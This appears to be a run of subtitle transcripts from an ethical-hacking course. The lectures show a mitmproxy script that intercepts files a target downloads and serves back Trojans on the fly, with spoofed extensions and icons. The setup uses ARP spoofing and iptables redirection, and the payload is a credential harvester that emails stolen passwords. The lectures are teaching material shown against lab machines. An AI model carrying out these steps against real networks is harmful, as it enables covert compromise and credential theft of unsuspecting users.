code in here will check whenever the user tries to download an EXE, it's going to create a Trojan out

95
00:07:13,300 --> 00:07:14,410
of that exe.

96
00:07:14,920 --> 00:07:20,110
But if you remember, our Trojan actually downloads an exe.

97
00:07:20,140 --> 00:07:22,270
It's downloads the evil file.

98
00:07:22,270 --> 00:07:24,370
So the evil file is an exe.

99
00:07:24,610 --> 00:07:31,120
It's going to be intercepted again and it's going to the the script is going to try to create a Trojan

100
00:07:31,120 --> 00:07:32,380
for the Trojan.

101
00:07:32,380 --> 00:07:37,990
It's going to download another Trojan and then it's going to try to create a Trojan for this other Trojan.

102
00:07:37,990 --> 00:07:41,380
And therefore the user will be stuck in a loop.

103
00:07:41,380 --> 00:07:45,610
That's why I'm adding this hash in here at the end of the URL.

104
00:07:45,910 --> 00:07:53,890
So in the Trojan, when it tries to download the exe that the target user is expecting, it won't be

105
00:07:53,890 --> 00:08:00,550
intercepted in this because this checks if the URL ends with a dot exe, the URL here is not going to

106
00:08:00,550 --> 00:08:01,630
end with a dot exe.

107
00:08:01,660 --> 00:08:04,000
It's it's going to end with the hash.

108
00:08:04,000 --> 00:08:07,090
So therefore it's going to let that go.

109
00:08:07,630 --> 00:08:12,760
So I'll need to add this at the end of my evil file URL as well.

110
00:08:12,760 --> 00:08:17,080
So if I scroll here, I have my evil file in here.

111
00:08:17,380 --> 00:08:18,790
Sorry, in here.

112
00:08:18,790 --> 00:08:27,070
And I'm going to add the hash sign to it as well so that it will not be intercepted in this loop in

113
00:08:27,070 --> 00:08:31,930
here, in this in this condition so that we don't get stuck in the loop.

114
00:08:32,350 --> 00:08:33,280
And that's it.

115
00:08:33,280 --> 00:08:34,540
Our file is ready.

116
00:08:34,540 --> 00:08:39,910
Now, in the next lecture, I'm just going to go through the code again one more time and then we're

117
00:08:39,910 --> 00:08:41,080
going to test it.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:01,120 --> 00:00:03,640
Okay, now our script is done.

2
00:00:03,640 --> 00:00:06,750
We can actually just go ahead and use it right now.

3
00:00:06,760 --> 00:00:11,800
But before I do that, I just want to review the whole thing to make sure that you understand what's

4
00:00:11,800 --> 00:00:14,170
going to happen and then we're going to test it.

5
00:00:14,620 --> 00:00:20,410
Now, first I actually want to be intercepting PDF files, not exe files.

6
00:00:20,410 --> 00:00:23,770
So I'm going to replace this in here with PDF.

7
00:00:25,130 --> 00:00:27,840
You can use anything, any file that you want.

8
00:00:27,860 --> 00:00:29,780
You can intercept any file you want.

9
00:00:29,780 --> 00:00:33,020
Just make sure you specify its extension in here.

10
00:00:33,620 --> 00:00:34,580
Now, same.

11
00:00:34,580 --> 00:00:39,530
Depending on the extension, you want to select an appropriate icon in here.

12
00:00:39,530 --> 00:00:42,530
So I'm selecting a PDF icon.

13
00:00:43,160 --> 00:00:49,830
Now let's go back to the file and talk about what's going to happen in a typical flow.

14
00:00:49,850 --> 00:00:55,730
So let's say the user is coming is using and it's he's just browsing the internet.

15
00:00:55,910 --> 00:00:58,370
Flow requests are going to come in here.

16
00:00:58,640 --> 00:01:04,820
Then we have this condition which will check if the request is going to this IP address.

17
00:01:05,120 --> 00:01:12,310
If it's not, then it's also going to check if the request ends with a PDF.

18
00:01:12,320 --> 00:01:21,650
So if the request has a URL and if the URL ends with a dot pdf, if it does, then it's going to execute

19
00:01:21,650 --> 00:01:22,740
my code in here.

20
00:01:22,760 --> 00:01:25,800
Otherwise it will just let that request flow.

21
00:01:26,070 --> 00:01:33,210
So this code in here will only be executed if the request is going to some IP other than my own IP.

22
00:01:33,540 --> 00:01:39,510
And if it has a URL that ends with an extension that I want to target.

23
00:01:40,250 --> 00:01:42,800
Now, once we go in here, we're going to print.

24
00:01:42,830 --> 00:01:44,570
We got an interesting flow.

25
00:01:44,870 --> 00:01:47,480
Then we have a variable.

26
00:01:47,510 --> 00:01:50,090
The variable is called front file.

27
00:01:50,090 --> 00:01:52,700
So you can think of this as a container.

28
00:01:52,820 --> 00:01:58,610
And this is going to contain the flow dot request dot URL.

29
00:01:58,640 --> 00:02:01,090
So this is basically the URL.

30
00:02:01,100 --> 00:02:03,290
It's the same URL that we were checking in here.

31
00:02:03,290 --> 00:02:11,510
If it ends with a with a dot pdf, this is the direct URL of the file that the target person is trying

32
00:02:11,510 --> 00:02:12,290
to download.

33
00:02:12,290 --> 00:02:20,840
So this is perfect for us to use as the front file when we generate our Trojan and that's why we are

34
00:02:20,840 --> 00:02:25,010
storing this in the front file in here in the front file variable.

35
00:02:26,360 --> 00:02:34,280
And I'm appending a hash to the end of it here to make sure that it doesn't get intercepted when the

36
00:02:34,280 --> 00:02:36,410
user downloads the file.

37
00:02:36,710 --> 00:02:42,300
Because our condition in here, it checks if the URL ends with a dot pdf.

38
00:02:42,320 --> 00:02:50,540
So if we end the URLs in our trojan with a hash, then they won't get intercepted when the user downloads

39
00:02:50,540 --> 00:02:51,020
them.

40
00:02:51,830 --> 00:02:52,760
And that's it.

41
00:02:52,790 --> 00:02:59,090
Now the next line in here, this is the line that's going to use my Trojan factory tool.

42
00:02:59,180 --> 00:03:01,550
So we've seen how to use this tool manually.

43
00:03:01,580 --> 00:03:08,930
We've seen that we can literally just use this command in terminal to generate a Trojan from any file.

44
00:03:09,260 --> 00:03:10,790
So that's what we're doing.

45
00:03:10,790 --> 00:03:17,420
We're doing Python followed by the location where the tool is stored, which is an opt Trojan factory.

46
00:03:17,450 --> 00:03:19,010
Trojan factory.py.

47
00:03:19,760 --> 00:03:24,980
Then we're giving it the first argument, which is dash F to specify the front file.

48
00:03:24,980 --> 00:03:27,420
The file that should be displayed to the user.

49
00:03:27,690 --> 00:03:35,430
And we're using a single quote to quote this file and then we're using a double quote to end the command

50
00:03:35,430 --> 00:03:41,010
so that we can place a variable because we can't place a variable inside the command itself.

51
00:03:41,490 --> 00:03:47,580
Then I have the variable name in here, which is front file, which is what I created in here, which

52
00:03:47,580 --> 00:03:53,170
contains the direct URL to the file that the target person is trying to download.

53
00:03:53,190 --> 00:03:56,100
So this is going to be used as the front file.

54
00:03:56,100 --> 00:03:59,730
So the file that the user is going to see when they run the Trojan.

55
00:04:00,330 --> 00:04:04,680
Then the rest of the command is pretty much the same that we did before.

56
00:04:04,950 --> 00:04:11,460
After that, we're specifying dash E to specify the eval file and I have my credential harvester in

57
00:04:11,460 --> 00:04:12,030
here.

58
00:04:12,060 --> 00:04:14,610
Like I said, you can have any file you want.

59
00:04:14,640 --> 00:04:16,650
You don't have to use a credential harvester.

60
00:04:16,650 --> 00:04:18,680
You can use a backdoor if you want.

61
00:04:18,690 --> 00:04:19,960
You can use a virus.

62
00:04:19,980 --> 00:04:27,810
I'm just using this for simplicity and it's already stored in my var w-w-w HTML so it can be downloaded

63
00:04:27,810 --> 00:04:29,520
from this direct URL.

64
00:04:30,030 --> 00:04:39,360
Then I'm specifying where I want to save this trojan and it's going to be saved in var w-w-w HTML file

65
00:04:39,360 --> 00:04:46,320
dot x and I'm storing it in here so that because that's the web route for my web server so that I can

66
00:04:46,320 --> 00:04:48,180
make my target download it.

67
00:04:48,720 --> 00:04:51,750
And finally, I'm specifying the icon.

68
00:04:51,750 --> 00:04:57,270
And like I said, make sure you specify an icon that corresponds to the front file.

69
00:04:58,570 --> 00:04:59,320
And that's it.

70
00:04:59,350 --> 00:05:02,080
Now, the next line, we already know what the next line does.

71
00:05:02,110 --> 00:05:04,360
It's going to modify the response.

72
00:05:04,390 --> 00:05:06,100
It's going to use a 301.

73
00:05:06,100 --> 00:05:13,540
Status code to redirect the file that the target person requested with a file that's stored in Http

74
00:05:13,570 --> 00:05:16,390
ten 2258 file dot exe.

75
00:05:16,930 --> 00:05:23,440
And this is going to be my Trojan because that's where I'm exporting my Trojan in the command in the

76
00:05:23,440 --> 00:05:25,750
previous line, as you can see in here.

77
00:05:25,750 --> 00:05:31,390
And the command I am exporting my trojan to w-w-w HTML file dot txt.

78
00:05:31,750 --> 00:05:35,020
So that's going to be the url for the file here.

79
00:05:36,160 --> 00:05:36,900
And that's it.

80
00:05:36,910 --> 00:05:38,260
Now our script is done.

81
00:05:38,470 --> 00:05:43,360
I'm going to save and then run it from man in the Middle proxy.

82
00:05:43,900 --> 00:05:47,110
So running it is going to be exactly the same as we do.

83
00:05:47,140 --> 00:05:51,210
Usually I'm going to use man in the middle proxy.

84
00:05:51,220 --> 00:05:57,510
I'm going to use Dash S to specify the script which is stored in root basic.py.

85
00:05:57,550 --> 00:06:00,490
And I'm running the script in transparent mode.

86
00:06:00,520 --> 00:06:03,280
I'm going to hit enter and that's working.

87
00:06:03,640 --> 00:06:07,260
The next step is going to be ARP spoofing my target.

88
00:06:07,270 --> 00:06:08,920
Like I said, you can be.

89
00:06:08,920 --> 00:06:13,390
This will work regardless of the method that you manage to become the man in the middle.

90
00:06:13,390 --> 00:06:16,060
You just have to be the man in the middle to use this.

91
00:06:16,060 --> 00:06:21,160
I'm going to become the man in the middle using ARP spoofing because it's just easier.

92
00:06:22,340 --> 00:06:29,540
Finally, we have to run our IP table command to redirect flows to flow through man in the middle dump

93
00:06:29,540 --> 00:06:32,810
so that it can analyze them and run our script.

94
00:06:32,840 --> 00:06:37,910
We spoke about all of this before, so I'm just doing it very quick and I'm going to go to my Windows

95
00:06:37,910 --> 00:06:38,600
machine.

96
00:06:39,920 --> 00:06:45,380
Now I'm going to look for a PDF, so I'm just going to look for a sample PDF.

97
00:06:49,260 --> 00:06:51,360
And I'm just going to zoom in.

98
00:06:52,380 --> 00:06:55,530
I'm just going to download the first result in here.

99
00:06:56,850 --> 00:06:58,100
Going to click on Save.

100
00:06:59,350 --> 00:07:00,940
Go to my downloads.

101
00:07:02,550 --> 00:07:05,650
Now, as you can see, we have a file here called File.

102
00:07:05,670 --> 00:07:07,650
It has a PDF icon.

103
00:07:07,680 --> 00:07:14,100
Now, when I run this, I shouldn't get a generic PDF, I shouldn't get an error.

104
00:07:14,100 --> 00:07:18,690
I should actually get the PDF that's supposed to be shown in here.

105
00:07:18,690 --> 00:07:22,860
So I should actually get the pdf that is stored on this URL.

106
00:07:22,980 --> 00:07:25,650
So let's double click it and see.

107
00:07:26,250 --> 00:07:33,510
And obviously at the same time my backdoor or my evil file should be executed in the background.

108
00:07:33,900 --> 00:07:40,860
Now as you can see, I actually got the right PDF, so this is the PDF that the user would expect when

109
00:07:40,860 --> 00:07:41,820
they click on this link.

110
00:07:41,820 --> 00:07:46,290
As you can see, this is a sample PDF and the name of the pdf is 995.

111
00:07:46,320 --> 00:07:49,440
So this is the right content for this pdf.

112
00:07:49,620 --> 00:07:52,290
Now if we go back to the Kali machine.

113
00:07:54,890 --> 00:07:59,900
You'll see that we got our report from my credential harvester.

114
00:07:59,990 --> 00:08:02,600
And if I open it, I have my password.

115
00:08:02,930 --> 00:08:07,580
Now, just to show you, just to make sure that the tool is working properly, I'm going to open the

116
00:08:07,580 --> 00:08:09,080
same PDF in here.

117
00:08:11,700 --> 00:08:16,920
And you'll see that we we're getting the exact same content that they should get.

118
00:08:16,920 --> 00:08:18,510
So it's the exact same file.

119
00:08:18,510 --> 00:08:23,280
And here being backdoored on the fly with our evil code.

120
00:08:23,640 --> 00:08:28,590
Just to show you another example, I'm going to go back and show you the next result here.

121
00:08:28,590 --> 00:08:35,190
It's another sample PDF and you can see this is an Adobe Acrobat PDF file, whatever.

122
00:08:35,220 --> 00:08:41,040
Let's go to the Windows machine and try to open that file and you'll see that this file again will be

123
00:08:41,040 --> 00:08:42,330
backdoored on the fly.

124
00:08:42,360 --> 00:08:48,810
So I'm going to download this file, I'm going to save it and this is going to be called the same name,

125
00:08:48,810 --> 00:08:51,090
but the content is going to be different.

126
00:08:51,090 --> 00:08:53,460
So this is the new file here.

127
00:08:53,460 --> 00:08:54,930
I'm going to double click it.

128
00:08:58,620 --> 00:09:02,750
And again, as you can see, we get a different file than the first file.

129
00:09:02,760 --> 00:09:09,450
So our Trojan is being generated on the fly and it corresponds to the file that the target person is

130
00:09:09,450 --> 00:09:10,140
downloading.

131
00:09:10,140 --> 00:09:16,580
So now when the person is downloading, for example, a research or something that they're there, they're

132
00:09:16,590 --> 00:09:20,100
literally looking for when they open it, they'll get what they're looking for.

133
00:09:20,100 --> 00:09:23,400
They'll get their research or they'll get the CV that they're looking for.

134
00:09:23,400 --> 00:09:27,510
But at the same time, our backdoor is going to run in the background.

135
00:09:27,510 --> 00:09:34,890
So if we come here and I go back to my inbox, I should have a new email and yeah, here it is, open

136
00:09:34,890 --> 00:09:37,440
that and I have my password in here.

137
00:09:38,160 --> 00:09:44,130
So as you can see, this is very, very, very powerful because now you're not sending anything to your

138
00:09:44,130 --> 00:09:44,520
target.

139
00:09:44,520 --> 00:09:47,580
Your target is willingly going and looking for a file.

140
00:09:47,580 --> 00:09:52,770
When they download that file, they'll get the file that they're looking for, but at the same time,

141
00:09:52,770 --> 00:09:55,920
your evil file is going to run in the background.

142
00:09:56,400 --> 00:09:59,200
Now, like I said, you can run this against any file.

143
00:09:59,220 --> 00:10:00,820
Doesn't have to be a PDF.

144
00:10:00,820 --> 00:10:07,540
All you have to do is just put the file extension in here and use an appropriate icon for it in the

145
00:10:07,540 --> 00:10:09,610
icon argument in here.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:01,220 --> 00:00:05,030
Okay, so what we've done so far is really cool.

2
00:00:05,060 --> 00:00:14,420
We know now how to analyze the flow of data and write our own script to intercept downloaded files and

3
00:00:14,420 --> 00:00:18,680
make a Trojan out of the file that the target person is downloading.

4
00:00:18,680 --> 00:00:20,570
So we're not replacing the file.

5
00:00:20,570 --> 00:00:26,690
We're actually given the target person, the file that they're requesting, but that file is going to

6
00:00:26,690 --> 00:00:32,690
be modified slightly so that when it's executed, it will show the target person, the file that they're

7
00:00:32,690 --> 00:00:38,570
looking for, and it'll run our evil code or our evil file in the background.

8
00:00:38,750 --> 00:00:43,490
But in my opinion, that attack can be enhanced a little bit.

9
00:00:43,730 --> 00:00:51,560
So from the previous lectures, we know that in our code in here we have to specify the file type that

10
00:00:51,560 --> 00:00:58,010
we want to intercept so we can put a PDF or EXE or MP3 or any other file type.

11
00:00:58,010 --> 00:01:06,630
But we're limited to one file type at a time, so we can't intercept pdf x txt mp3.

12
00:01:06,780 --> 00:01:10,560
At the same time, we have to modify this part in here.

13
00:01:11,100 --> 00:01:18,570
The other problem is if we go here and come on this file, you'll see the file name is going to always

14
00:01:18,600 --> 00:01:19,890
be called file.

15
00:01:19,890 --> 00:01:25,350
So regardless of the file that the target is going to download, the file is always going to be called

16
00:01:25,350 --> 00:01:26,040
file.

17
00:01:26,820 --> 00:01:36,540
The third problem is if we go on view here and click on file name extensions, this will show the extension

18
00:01:36,540 --> 00:01:39,510
and you'll see at the end it's going to be an EXE.

19
00:01:39,990 --> 00:01:46,740
So even though it has a PDF icon and when the target person double click it, they'll get a PDF.

20
00:01:46,770 --> 00:01:52,680
The file is still a bit suspicious because you can see that it ends with a dot exe.

21
00:01:53,670 --> 00:02:01,560
So to solve this problem I made a script that's actually part of the Trojan factory repo so you can

22
00:02:01,560 --> 00:02:02,850
see the script name in here.

23
00:02:02,850 --> 00:02:06,060
It's called Man in the Middle Proxy script.

24
00:02:06,120 --> 00:02:11,700
And basically this script is based on the script that we made in the previous lectures.

25
00:02:11,730 --> 00:02:15,300
The only difference is it has some extra features.

26
00:02:15,600 --> 00:02:22,530
So first of all, it uses proper implementation of the Trojan factory file so it doesn't use Popen to

27
00:02:22,530 --> 00:02:24,270
invoke that program.

28
00:02:24,630 --> 00:02:27,060
It supports multiple file types.

29
00:02:27,060 --> 00:02:34,170
So instead of being limited to X only or PDF only, you can specify a number of files to intercept and

30
00:02:34,170 --> 00:02:35,820
make Trojans out of them.

31
00:02:36,180 --> 00:02:40,620
It will automatically change the file name to spoof its extension.

32
00:02:40,620 --> 00:02:45,000
So when the target person downloads a file, it's not going to be a dot exe.

33
00:02:45,240 --> 00:02:48,420
If they're downloading a PDF, it's going to be a dot pdf.

34
00:02:48,450 --> 00:02:56,700
If they're downloading an MP4, it's going to be an MP4 and it will also automatically add an icon to

35
00:02:56,700 --> 00:02:59,490
the downloaded file to match the file type.

36
00:02:59,490 --> 00:03:05,010
So if the target person again is downloading a PDF, it'll automatically select an icon for a PDF.

37
00:03:05,040 --> 00:03:11,310
If they're downloading a txt, it will automatically select an icon for a txt and so on.

38
00:03:11,820 --> 00:03:13,710
Now let me show you how this tool works.

39
00:03:13,710 --> 00:03:15,600
Actually using it is very simple.

40
00:03:16,020 --> 00:03:23,190
It's already added to the Trojan factory repo, so whenever you clone it, when you do git clone and

41
00:03:23,190 --> 00:03:29,460
put the URL for the Trojan factory, you'll get this script in the same directory as the Trojan factory.

42
00:03:30,110 --> 00:03:31,190
So I'll show you.

43
00:03:31,190 --> 00:03:38,180
So if you go to your file manager and just navigate to opt Trojan Factory, you'll see that you have

44
00:03:38,180 --> 00:03:40,940
a file called Man in the Middle Proxy script.

45
00:03:41,240 --> 00:03:45,620
And when you open that, you will get this script right here.

46
00:03:46,400 --> 00:03:51,410
Now, if you actually go down and look at the code, you'll see the code is very similar to what we've

47
00:03:51,410 --> 00:03:55,790
been using, especially the code that intercepts the downloaded files.

48
00:03:55,880 --> 00:04:02,510
The only difference is, like I said, it does all the extra features and it implements the Trojan file

49
00:04:02,510 --> 00:04:05,840
so it doesn't use Popen to invoke the program.

50
00:04:06,470 --> 00:04:11,300
Now, in order to use this script, first of all, you have to set a few variables.

51
00:04:11,570 --> 00:04:18,020
So the first thing that you need to set is the IP of your computer and you want to place it between

52
00:04:18,020 --> 00:04:19,700
these two quotations.

53
00:04:20,030 --> 00:04:24,830
As you can see in my example, it's ten 2258 so I'm leaving it the way it is.

54
00:04:25,550 --> 00:04:29,580
The next thing that you need to set is the extensions to target.

55
00:04:29,600 --> 00:04:35,220
So like I said, in our basic dot pi in here, this script will only target PDF.

56
00:04:35,250 --> 00:04:39,590
If you modify this part here to x, it will only target x.

57
00:04:40,810 --> 00:04:46,920
And the example that I'm showing you today, it actually uses a list of file types in here.

58
00:04:46,930 --> 00:04:55,000
So you can see that the list that I have currently will intercept X, PDF and TXT, and if you want

59
00:04:55,000 --> 00:05:01,840
to intercept more file types, then all you have to do is just add a comma here and then put the name

60
00:05:01,840 --> 00:05:06,970
of the file type that you want to intercept between two quotation marks.

61
00:05:06,970 --> 00:05:10,720
So let's say you wanted to add MP three then just add dot.

62
00:05:10,720 --> 00:05:13,630
MP three Simple as that.

63
00:05:14,020 --> 00:05:19,150
The next thing that you want to set is the link to your evil file.

64
00:05:19,150 --> 00:05:28,600
So I'm using the same evil file that I've been using and that's stored in http ten 2258 evil dot x so

65
00:05:28,600 --> 00:05:30,340
it's stored in my web root.

66
00:05:30,910 --> 00:05:38,590
Now remember to add the hash here to the end of the file and remember that this needs to be a direct

67
00:05:38,590 --> 00:05:39,580
download link.

68
00:05:39,580 --> 00:05:46,130
So it needs to allow the target person to download this X without showing any delay, without showing

69
00:05:46,130 --> 00:05:47,560
any ads.

70
00:05:47,570 --> 00:05:51,260
It needs to basically go directly to the X.

71
00:05:52,250 --> 00:05:57,740
The last thing that you could modify but you probably won't need to do it, is the web root and this

72
00:05:57,740 --> 00:06:00,950
is the path where your web server files are stored.

73
00:06:00,950 --> 00:06:05,150
And by default in Kali, that's in var W-w-w HTML.

74
00:06:05,150 --> 00:06:07,700
And again, that's why I'm going to keep it the same.

75
00:06:08,450 --> 00:06:16,010
There is also a flag here that you can set this to false if you do not want to spoof the file extension.

76
00:06:16,010 --> 00:06:22,430
So if you want this script to work like the script that we seen in the previous lecture, I'm keeping

77
00:06:22,430 --> 00:06:30,290
this at true because I want the script to automatically spoof the file extension to the same extension

78
00:06:30,290 --> 00:06:34,520
as the front file or the file that the target person is expecting.

79
00:06:35,180 --> 00:06:42,230
One more thing that I'd like to note is in the Trojan factory there is a directory called Icons.

80
00:06:42,620 --> 00:06:48,170
In here you'll see the icons that the script will use for the Trojan.

81
00:06:48,620 --> 00:06:54,890
So if you need to add more icons to this, all you have to do is just add the icon in this directory,

82
00:06:54,920 --> 00:07:00,770
make sure that it's a dot ICO and make sure you name the icon to the file type.

83
00:07:00,770 --> 00:07:05,390
So for example, you can see that the PDF icon is called pdf dot ICO.

84
00:07:05,420 --> 00:07:10,160
The MP three icon is called MP three dot ICO and so on.

85
00:07:10,900 --> 00:07:12,310
Now we're all set.

86
00:07:12,310 --> 00:07:17,830
And this lecture, I just wanted to show you how to modify all the variables for the script.

87
00:07:17,830 --> 00:07:23,890
And in the next lecture, I'll show you how to run the script with Man in the Middle Proxy and target

88
00:07:23,890 --> 00:07:30,910
a remote computer so that we can generate Trojans for any file that they download with the right name

89
00:07:30,910 --> 00:07:32,500
with the right extension.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,620 --> 00:00:05,720
Okay, now that we modified the script variables to make sure that it's going to run the way we want

2
00:00:05,720 --> 00:00:06,170
it.

3
00:00:06,200 --> 00:00:11,480
In this lecture, I'm going to show you how to use the script with Man in the Middle Proxy to target

4
00:00:11,480 --> 00:00:18,650
a remote computer and replace any file that they download with a Trojan with the right extension and

5
00:00:18,650 --> 00:00:19,910
with the right icon.

6
00:00:20,830 --> 00:00:25,960
Now using this script is going to be identical to using any other script.

7
00:00:26,830 --> 00:00:30,670
So the first thing that we need to do is run man in the middle dump.

8
00:00:33,090 --> 00:00:37,410
And give it the location where the script is stored after the argument.

9
00:00:37,410 --> 00:00:41,790
And that's going to be in Opt Trojan factory.

10
00:00:41,790 --> 00:00:45,780
And the name of the file is Man in the Middle proxy script.

11
00:00:46,320 --> 00:00:52,020
Then I'm going to do Dash Dash Transparent to run the script in transparent mode.

12
00:00:53,210 --> 00:00:55,760
And thus the script running for me right now.

13
00:00:56,150 --> 00:00:59,540
The next thing that we need to do is become the man in the middle.

14
00:00:59,540 --> 00:01:04,340
And as you know, I prefer to become the man in the middle using an ARP spoofing attack.

15
00:01:04,340 --> 00:01:10,400
But as you know, you can you can use this regardless of the method that you use to become the man in

16
00:01:10,400 --> 00:01:11,060
the middle.

17
00:01:11,270 --> 00:01:14,870
So I'm using the exact same ettercap command that we always use.

18
00:01:15,870 --> 00:01:17,100
And that's done.

19
00:01:17,100 --> 00:01:26,220
And finally, you want to use IP tables to redirect requests from port 80 to 8080 where man in the middle

20
00:01:26,220 --> 00:01:27,360
proxy is running.

21
00:01:27,690 --> 00:01:30,510
I'm going to hit enter and that's it.

22
00:01:30,510 --> 00:01:31,230
We're done.

23
00:01:31,260 --> 00:01:34,100
Now we're going to go to the Windows machine and test this.

24
00:01:34,110 --> 00:01:42,570
And any time we try to download an exe a PDF, a TXT or an MP3, the target person should get a file

25
00:01:42,570 --> 00:01:50,430
with an appropriate icon, with an appropriate file type with an appropriate extension, and it should

26
00:01:50,430 --> 00:01:55,650
run the file that they're expecting and at the same time run my evil file at the background.

27
00:01:55,800 --> 00:01:59,910
Now I'm going to show you my email here that I have no notifications.

28
00:01:59,910 --> 00:02:05,100
And as usual, I'm testing this with my credential harvester, but you can test it with any other file

29
00:02:05,100 --> 00:02:06,150
that you want.

30
00:02:06,920 --> 00:02:09,350
So here is my Windows machine.

31
00:02:09,380 --> 00:02:10,970
Let's go to Google.

32
00:02:17,600 --> 00:02:20,390
And let's first of all download a PDF.

33
00:02:20,660 --> 00:02:23,120
So I'm going to look for sample PDF.

34
00:02:25,380 --> 00:02:28,050
And I'm going to download the second result this time.

35
00:02:30,440 --> 00:02:36,650
Now, as you can see, it's showing us the file in a zip format because the extension spoofer will not

36
00:02:36,650 --> 00:02:39,200
work when it's served over Http.

37
00:02:39,440 --> 00:02:43,250
So that's why the tool will automatically add this file to a zip.

38
00:02:43,640 --> 00:02:50,720
Now, if you don't want the file to be served as a zip, you can just set the spoof extension variable

39
00:02:50,720 --> 00:02:52,670
to false in here.

40
00:02:55,650 --> 00:02:57,240
Now I'm going to save this.

41
00:02:57,870 --> 00:03:01,230
And let's go ahead and look for a sample text file.

42
00:03:05,330 --> 00:03:07,670
Okay, let's download the first result.

43
00:03:08,120 --> 00:03:10,520
And again, you can see the file name is correct here.

44
00:03:10,520 --> 00:03:11,660
It's called Humans.

45
00:03:13,530 --> 00:03:17,700
And finally, let's go ahead and download an X and let's look for WinZip.

46
00:03:22,070 --> 00:03:24,040
Going to download it from here.

47
00:03:24,060 --> 00:03:25,440
Save that.

48
00:03:28,290 --> 00:03:29,010
And that's it.

49
00:03:29,040 --> 00:03:30,540
We're done with our downloads.

50
00:03:30,540 --> 00:03:33,480
We downloaded a zip and x and a PDF.

51
00:03:33,960 --> 00:03:36,720
Let's go to my downloads and see what I have.

52
00:03:37,690 --> 00:03:40,030
So as you can see, I have the three files.

53
00:03:40,030 --> 00:03:46,060
And like I said, all of them are added into archives because the spoofed extension will not look normal

54
00:03:46,060 --> 00:03:48,220
if it's downloaded over Http.

55
00:03:48,550 --> 00:03:51,400
So that's why the tool adds them to archives.

56
00:03:51,610 --> 00:03:55,190
Now let's go ahead and start with our PDF.

57
00:03:55,210 --> 00:03:59,260
In here I'm going to right click it and extract it here.

58
00:04:00,460 --> 00:04:03,940
And as you can see now, this file has.

59
00:04:03,970 --> 00:04:05,230
It has this right name.

60
00:04:05,230 --> 00:04:10,050
So it's called sample and it has the right extension called PDF.

61
00:04:10,060 --> 00:04:14,920
And here you can see that the file that we used in the previous lecture had the wrong extension.

62
00:04:14,920 --> 00:04:16,000
It had a dot exe.

63
00:04:16,960 --> 00:04:20,010
So this file is certainly less suspicious.

64
00:04:20,020 --> 00:04:25,600
The only thing is that it actually has an exe in the file name, not in the extension.

65
00:04:25,600 --> 00:04:31,690
And that's the only way that you can spoof the extension because we're using the right to left override,

66
00:04:31,690 --> 00:04:36,370
which I explain in details in my social engineering course and the general ethical hacking course,

67
00:04:36,370 --> 00:04:37,930
I show how to do this manually.

68
00:04:38,380 --> 00:04:43,600
So if you want to learn how to do this manually, you can go check out these other courses.

69
00:04:43,600 --> 00:04:48,730
For now, we're doing this using a script because this is a network hacking course, not a social engineering

70
00:04:48,730 --> 00:04:49,360
course.

71
00:04:49,750 --> 00:04:52,660
Now let's execute this and see what happens.

72
00:04:53,790 --> 00:04:56,760
So we're going to get the file that we are expecting.

73
00:04:57,030 --> 00:05:03,060
And it's not a generic file, it's the file that the target person is actually looking for.

74
00:05:03,300 --> 00:05:08,430
And if we go to Cali to our email, you can see that I got the report in here.

75
00:05:09,430 --> 00:05:11,950
Now let's go back and test the other files.

76
00:05:13,890 --> 00:05:18,990
So let's, for example, extract this human's dot zip in here, which is a txt.

77
00:05:20,310 --> 00:05:24,890
Now again and note how the tool is automatically set in the right icon.

78
00:05:24,900 --> 00:05:31,110
So in here we have a PDF and it had a PDF icon and here the target person downloaded the TXT.

79
00:05:31,380 --> 00:05:32,940
It's called the right name.

80
00:05:32,940 --> 00:05:36,180
It has the right extension and it has the right icon.

81
00:05:36,300 --> 00:05:43,080
When we double click it, we'll get the right file that that the target person was looking for and our

82
00:05:43,080 --> 00:05:45,120
backdoor is going to run at the background.

83
00:05:45,120 --> 00:05:48,600
And if we come here, as you can see, we got another email.

84
00:05:48,930 --> 00:05:51,180
So our X got executed.

85
00:05:51,840 --> 00:05:53,760
Same will work with the WinZip file.

86
00:05:53,760 --> 00:05:55,890
So I'll just show it to you real quick here.

87
00:05:55,890 --> 00:05:57,480
I'm going to extract it.

88
00:06:00,100 --> 00:06:05,740
And then if I double click it, I will get the X here.

89
00:06:06,160 --> 00:06:09,340
And actually you can notice it has the right icon.

90
00:06:09,340 --> 00:06:13,630
It has an X extension and we got the installer for WinZip.

91
00:06:13,630 --> 00:06:16,320
So again, it's what the target person is looking for.

92
00:06:16,330 --> 00:06:22,930
And if we go back here, you'll see we got our third report now clicking on all these reports to make

93
00:06:22,930 --> 00:06:25,540
sure our X got executed properly.

94
00:06:25,660 --> 00:06:31,300
We'll be able to see that the credential harvester got me the login and the password.

95
00:06:31,300 --> 00:06:37,270
So it worked perfectly and at the same time it displayed the file that the target person is downloading.

96
00:06:37,900 --> 00:06:44,620
So I think this script is very powerful because it's going to replace any file that the target person

97
00:06:44,620 --> 00:06:45,400
downloads.

98
00:06:45,400 --> 00:06:51,010
So regardless of its extension, it's going to be able to create a Trojan that will show the target

99
00:06:51,010 --> 00:06:56,910
person that the file that they're looking for and at the same time run our backdoor in the background

100
00:06:56,920 --> 00:07:01,810
so you're not interacting with the target, you're not sending them anything, you're not trying to

101
00:07:01,810 --> 00:07:02,560
fool them.

102
00:07:02,560 --> 00:07:05,260
They're willingly going to download something.

103
00:07:05,260 --> 00:07:10,990
When they download that something, you will automatically give them that something with a little gift.

104
00:07:10,990 --> 00:07:17,740
And that gift is our backdoor or our credential harvester or any other file that you want to run in

105
00:07:17,740 --> 00:07:18,640
the background.

106
00:07:19,060 --> 00:07:25,600
Now, in order to write this extra script, you need to have a little bit more experience in programming.

107
00:07:25,600 --> 00:07:28,660
And that's why I didn't cover how to write this file.

108
00:07:28,780 --> 00:07:32,440
But you can go on your own time and have a look through it.

109
00:07:32,440 --> 00:07:36,190
If you have any questions, you can ask me in the discussions and I'll help you with it.

110
00:07:36,190 --> 00:07:42,920
But writing this will require a lot of knowledge about programming, and this is not a programming course.

111
00:07:42,980 --> 00:07:48,350
I am planning on making a programming course in the future that I might show stuff like that in it.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 12: Post-Connection Attacks - Doing All Of The Above On HTTPS Websites

1
00:00:00,680 --> 00:00:01,340
Okay.

2
00:00:01,340 --> 00:00:09,050
So far we've seen how powerful man in the middle proxy is and how it can be used to run so many attacks.

3
00:00:09,470 --> 00:00:15,440
